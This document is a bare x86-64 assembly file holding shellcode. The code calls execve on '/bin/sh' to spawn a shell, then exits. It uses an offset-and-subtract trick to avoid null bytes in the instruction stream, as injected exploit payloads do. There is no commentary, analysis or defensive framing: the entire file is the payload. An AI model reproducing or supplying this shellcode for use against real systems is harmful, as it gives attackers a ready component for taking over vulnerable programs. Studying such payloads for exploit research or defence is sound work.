; x86_64.asm

section .text
	global _start

_start:

  xor rax, rax
  xor rdi, rdi
  xor rdx, rdx

  push rdi

  lea rdi, [rel _pathname + 0x10101010]
  sub rdi, 0x10101010

  push rdi
  mov rsi, rsp

	mov al, 59

	syscall

	xor rax, rax
	mov al, 60

	xor rdi, rdi

	syscall

_pathname:
	db "/bin/sh",0
